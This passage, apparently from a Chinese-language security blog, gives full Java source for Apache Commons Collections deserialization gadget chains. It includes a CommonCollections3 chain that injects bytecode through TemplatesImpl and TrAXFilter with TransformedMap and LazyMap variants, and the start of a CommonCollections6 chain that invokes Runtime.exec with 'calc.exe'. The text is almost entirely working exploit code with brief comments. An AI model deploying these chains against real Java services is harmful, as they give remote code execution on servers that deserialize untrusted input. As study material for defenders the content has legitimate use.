<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token static">setFieldValue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonCollections3</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span>HelloTemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">//        CC_LazyMap(fakeTransformers, transformers);</span>
        <span class="token class-name">CC_No_Transformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_TransformedMap</span><span class="token punctuation">(</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
<span class="token comment">//        Transformer[] transformers = new Transformer[]&#123;</span>
<span class="token comment">//                new ConstantTransformer(obj),</span>
<span class="token comment">//                new InvokerTransformer("newTransformer", null, null)</span>
<span class="token comment">//        &#125;;</span>
        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 手动put触发</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_LazyMap</span><span class="token punctuation">(</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers<span class="token punctuation">,</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
<span class="token comment">//        Transformer[] fakeTransformers = new Transformer[] &#123;</span>
<span class="token comment">//                new ConstantTransformer(1)</span>
<span class="token comment">//        &#125;;</span>
<span class="token comment">//        Transformer[] transformers = new Transformer[]&#123;</span>
<span class="token comment">//                new ConstantTransformer(TrAXFilter.class),</span>
<span class="token comment">//                new InstantiateTransformer(new Class[] &#123; Templates.class &#125;, new Object[] &#123; obj &#125;)</span>
<span class="token comment">//        &#125;;</span>
        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TiedMapEntry</span> tme <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span> <span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tme<span class="token punctuation">,</span><span class="token string">"valuevalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">out</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_No_Transformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span>HelloTemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getClass"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TiedMapEntry</span> tme <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tme<span class="token punctuation">,</span> <span class="token string">"valuevalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        outerMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">"iMethodName"</span><span class="token punctuation">,</span> <span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// ==================</span>
        <span class="token comment">// 生成序列化字符串</span>
        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>HelloTemplatesImpl</code>类代码用的就是CC2的代码</p>
<h3 id="CommonCollections6"><a href="#CommonCollections6" class="headerlink" title="CommonCollections6"></a>CommonCollections6</h3><p><code>TiedMapEntry</code>链</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonCollections6</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc.exe"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
